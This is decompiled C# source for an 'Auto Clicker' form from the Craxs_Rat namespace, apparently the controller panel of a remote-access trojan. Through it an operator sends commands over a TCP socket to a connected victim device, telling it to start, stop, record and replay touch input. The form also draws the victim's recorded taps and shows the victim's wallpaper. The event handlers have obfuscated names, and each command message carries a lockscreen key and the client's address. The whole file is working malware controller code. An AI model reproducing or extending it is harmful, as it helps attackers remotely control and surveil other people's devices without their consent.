using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Auto_Clicker : Form
{
	public delegate void Drawdele(object[] obj);

	public delegate void updatedele(object[] obj);

	public delegate void recordnames(object[] obj);

	private IContainer components;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[CompilerGenerated]
	[AccessedThroughProperty("refreshbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _refreshbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	public Client Classclient;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statustext")]
	internal virtual Label statustext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel3_MouseClick;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.MouseClick -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("selectedrecord")]
	internal virtual DrakeUIComboBox selectedrecord
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DrakeUIAvatar refreshbtn
	{
		[CompilerGenerated]
		get
		{
			return _refreshbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwnmydf;
			DrakeUIAvatar drakeUIAvatar = _refreshbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_refreshbtn = value;
			drakeUIAvatar = _refreshbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsgdfer;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdxzc;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatstybgtdq;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon3 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdaswcdnb;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon5 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon5;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("clientimage")]
	internal virtual PictureBox clientimage
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.Panel1 = new System.Windows.Forms.Panel();
		this.statustext = new System.Windows.Forms.Label();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.clientimage = new System.Windows.Forms.PictureBox();
		this.DrakeUIButtonIcon5 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.refreshbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.Label1 = new System.Windows.Forms.Label();
		this.selectedrecord = new DrakeUI.Framework.DrakeUIComboBox();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Panel1.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.clientimage).BeginInit();
		base.SuspendLayout();
		this.Panel1.Controls.Add(this.statustext);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel1.Location = new System.Drawing.Point(0, 866);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(578, 33);
		this.Panel1.TabIndex = 4;
		this.statustext.BackColor = System.Drawing.Color.Black;
		this.statustext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.statustext.ForeColor = System.Drawing.Color.SkyBlue;
		this.statustext.Location = new System.Drawing.Point(0, 0);
		this.statustext.Name = "statustext";
		this.statustext.Size = new System.Drawing.Size(578, 33);
		this.statustext.TabIndex = 0;
		this.statustext.Text = "...";
		this.statustext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.clientimage);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon5);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon4);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon3);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel2.Controls.Add(this.refreshbtn);
		this.Panel2.Controls.Add(this.Label1);
		this.Panel2.Controls.Add(this.selectedrecord);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(578, 158);
		this.Panel2.TabIndex = 5;
		this.clientimage.Location = new System.Drawing.Point(12, 49);
		this.clientimage.Name = "clientimage";
		this.clientimage.Size = new System.Drawing.Size(71, 66);
		this.clientimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.clientimage.TabIndex = 36;
		this.clientimage.TabStop = false;
		this.DrakeUIButtonIcon5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon5.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon5.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon5.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.Location = new System.Drawing.Point(380, 84);
		this.DrakeUIButtonIcon5.Name = "DrakeUIButtonIcon5";
		this.DrakeUIButtonIcon5.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon5.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon5.Size = new System.Drawing.Size(104, 66);
		this.DrakeUIButtonIcon5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon5.Symbol = 61584;
		this.DrakeUIButtonIcon5.TabIndex = 35;
		this.DrakeUIButtonIcon5.Text = "Repeat";
		this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon4.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(210, 85);
		this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
		this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(104, 66);
		this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.Symbol = 61741;
		this.DrakeUIButtonIcon4.TabIndex = 34;
		this.DrakeUIButtonIcon4.Text = "Clear";
		this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon3.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon3.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(210, 13);
		this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
		this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(104, 66);
		this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon3.Symbol = 61517;
		this.DrakeUIButtonIcon3.TabIndex = 33;
		this.DrakeUIButtonIcon3.Text = "Record";
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(107, 85);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(97, 66);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 61516;
		this.DrakeUIButtonIcon2.TabIndex = 32;
		this.DrakeUIButtonIcon2.Text = "Stop";
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(107, 12);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(97, 66);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 61515;
		this.DrakeUIButtonIcon1.TabIndex = 31;
		this.DrakeUIButtonIcon1.Text = "Start";
		this.refreshbtn.AvatarSize = 45;
		this.refreshbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.refreshbtn.FillColor = System.Drawing.Color.Transparent;
		this.refreshbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.refreshbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.refreshbtn.Location = new System.Drawing.Point(541, 47);
		this.refreshbtn.Name = "refreshbtn";
		this.refreshbtn.Size = new System.Drawing.Size(32, 32);
		this.refreshbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.refreshbtn.Symbol = 61473;
		this.refreshbtn.SymbolSize = 25;
		this.refreshbtn.TabIndex = 30;
		this.refreshbtn.Text = "DrakeUIAvatar3";
		this.Label1.AutoSize = true;
		this.Label1.Font = new System.Drawing.Font("Calibri", 12f);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(387, 19);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(82, 24);
		this.Label1.TabIndex = 6;
		this.Label1.Text = "Records";
		this.selectedrecord.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.selectedrecord.FillColor = System.Drawing.Color.Black;
		this.selectedrecord.Font = new System.Drawing.Font("Calibri", 12f);
		this.selectedrecord.ForeColor = System.Drawing.Color.SkyBlue;
		this.selectedrecord.Location = new System.Drawing.Point(343, 49);
		this.selectedrecord.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.selectedrecord.MinimumSize = new System.Drawing.Size(63, 0);
		this.selectedrecord.Name = "selectedrecord";
		this.selectedrecord.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.selectedrecord.RectColor = System.Drawing.Color.SkyBlue;
		this.selectedrecord.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.selectedrecord.Size = new System.Drawing.Size(191, 32);
		this.selectedrecord.Style = DrakeUI.Framework.UIStyle.Custom;
		this.selectedrecord.TabIndex = 5;
		this.selectedrecord.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(0, 158);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(578, 708);
		this.Panel3.TabIndex = 6;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(578, 899);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "Auto_Clicker";
		base.ShowIcon = false;
		this.Text = "Auto Clicker";
		this.Panel1.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.clientimage).EndInit();
		base.ResumeLayout(false);
	}

	public Auto_Clicker()
	{
		base.Load += Auto_Clicker_Load;
		base.FormClosing += Auto_Clicker_FormClosing;
		InitializeComponent();
	}

	public void DrawPoint(object[] obj)
	{
		if (Panel3.InvokeRequired)
		{
			Drawdele method = DrawPoint;
			Panel3.Invoke(method, new object[1] { obj });
			return;
		}
		int num = Conversions.ToInteger(obj[0]);
		int num2 = Conversions.ToInteger(obj[1]);
		int num3 = Conversions.ToInteger(obj[2]);
		int num4 = Conversions.ToInteger(obj[3]);
		Graphics graphics = Panel3.CreateGraphics();
		Pen pen = new Pen(Color.Red, 10f);
		Point point = checked(new Point((int)Math.Round((double)num * ((double)Panel3.Width / (double)num3)), (int)Math.Round((double)num2 * ((double)Panel3.Height / (double)num4))));
		graphics.DrawEllipse(pen, point.X, point.Y, 6, 6);
	}

	public void UpdateStatus(object[] obj)
	{
		if (statustext.InvokeRequired)
		{
			updatedele method = UpdateStatus;
			statustext.Invoke(method, new object[1] { obj });
		}
		else
		{
			string text = Conversions.ToString(obj[0]);
			statustext.Text = text;
		}
	}

	public void AddRecords(object[] obj)
	{
		if (selectedrecord.InvokeRequired)
		{
			recordnames method = AddRecords;
			selectedrecord.Invoke(method, new object[1] { obj });
			return;
		}
		string[] array = (string[])obj[0];
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				if (!selectedrecord.Items.Contains(text))
				{
					selectedrecord.Items.Add(text);
					selectedrecord.Text = text;
					selectedrecord.Refresh();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Panel3_MouseClick(object sender, MouseEventArgs e)
	{
	}

	private void Button1_Click_1(object sender, EventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwnmydf(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "Aclk<*>[L]" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsgdfer(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "Aclk<*>Start" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdxzc(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "Aclk<*>Stop" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatstybgtdq(object sender, EventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			Dialog1 dialog = new Dialog1();
			dialog.Title = "Enter Record Name";
			dialog.ShowDialog();
			if (dialog.DialogResult == DialogResult.OK)
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "Aclk<*>{Record," + dialog.TheText + "}" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
		}
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		Panel3.Invalidate();
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdaswcdnb(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(selectedrecord.Text) | string.IsNullOrWhiteSpace(selectedrecord.Text))
		{
			CraxsAlert.Showinformation("Select Record First");
		}
		else if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "Aclk<*>{Repet," + selectedrecord.Text + "}" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}

	private void Auto_Clicker_Load(object sender, EventArgs e)
	{
		clientimage.Image = Classclient.Wallpaper;
	}

	private void Auto_Clicker_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (Classclient != null)
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "Aclk<*>Stop" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
	}
}
